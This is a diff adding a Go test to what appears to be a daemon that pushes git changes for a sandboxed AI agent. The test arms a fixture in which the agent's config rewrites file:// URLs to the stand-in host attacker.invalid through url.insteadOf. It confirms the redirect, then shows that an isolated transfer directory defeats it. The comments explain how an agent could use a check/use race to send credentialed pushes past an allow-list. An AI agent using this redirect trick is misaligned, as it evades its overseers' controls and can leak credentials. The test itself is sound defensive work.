@@ -667,3 +667,65 @@ func TestLinkedWorktreeToleratesANonCanonicalCommonDir(t *testing.T) {
 	assert.Nil(t, fault,
 		"the same directory under two spellings must be recognised as one; got %+v", fault)
 }
+
+// TestRealGit_TransferDirIgnoresAgentInsteadOf is the proof that the isolated
+// transfer actually closes the check/use race, rather than merely looking like
+// it should.
+//
+// `url.*.insteadOf` is the sharpest of the unpinnable keys: it has no reset
+// form, so no `-c` override can neutralise it, and the refusal that catches it
+// runs in a different process from the push. An agent that rewrites
+// .git/config in that window redirects the credentialed command to a host the
+// allow-list never saw.
+//
+// Both halves run. The CONTROL pushes from the agent's own repository with the
+// hostile config in place and must be redirected — without it, the isolated run
+// below could pass because the attack was never armed.
+func TestRealGit_TransferDirIgnoresAgentInsteadOf(t *testing.T) {
+	gitPath := gitAvailable(t)
+	work, bare := realGitRepo(t, gitPath)
+	home := filepath.Dir(work)
+
+	git := func(dir string, args ...string) (string, error) {
+		c := exec.Command(gitPath, args...)
+		c.Dir = dir
+		c.Env = realGitEnv(home)
+		out, err := c.CombinedOutput()
+		return string(out), err
+	}
+	// The agent rewrites file:// to a host that does not exist. Anything that
+	// reads this config and dials file:// goes there instead.
+	_, err := git(work, "config", `url.https://attacker.invalid/.insteadOf`, "file://")
+	require.NoError(t, err)
+
+	sha, err := git(work, "rev-parse", "HEAD")
+	require.NoError(t, err)
+	head := strings.TrimSpace(sha)
+	dest := "file://" + bare
+
+	// CONTROL: from the agent's repository, the push is redirected.
+	out, err := git(work, "-c", "protocol.file.allow=always", "push", dest, head+":refs/heads/control")
+	require.Error(t, err, "the fixture must actually be armed; output=%s", out)
+	assert.Contains(t, out, "attacker.invalid",
+		"the control must show the redirect this test exists to defeat")
+
+	// ISOLATED: the same push, from a daemon-owned transfer directory that
+	// borrows the agent's objects and never reads its configuration.
+	xfer := filepath.Join(home, "xfer.git")
+	_, err = git(home, "init", "--bare", "-q", xfer)
+	require.NoError(t, err)
+	objects, err := git(work, "rev-parse", "--path-format=absolute", "--git-path", "objects")
+	require.NoError(t, err)
+	require.NoError(t, os.WriteFile(filepath.Join(xfer, "objects", "info", "alternates"),
+		[]byte(strings.TrimSpace(objects)+"\n"), 0o600))
+
+	out, err = git(xfer, "--git-dir", xfer, "-c", "protocol.file.allow=always",
+		"push", dest, head+":refs/heads/isolated")
+	require.NoErrorf(t, err, "the isolated push must reach the real destination; output=%s", out)
+	assert.NotContains(t, out, "attacker.invalid")
+
+	// And it really landed, from objects that were never copied.
+	landed, err := git(home, "--git-dir", bare, "rev-parse", "refs/heads/isolated")
+	require.NoError(t, err)
+	assert.Equal(t, head, strings.TrimSpace(landed))
+}
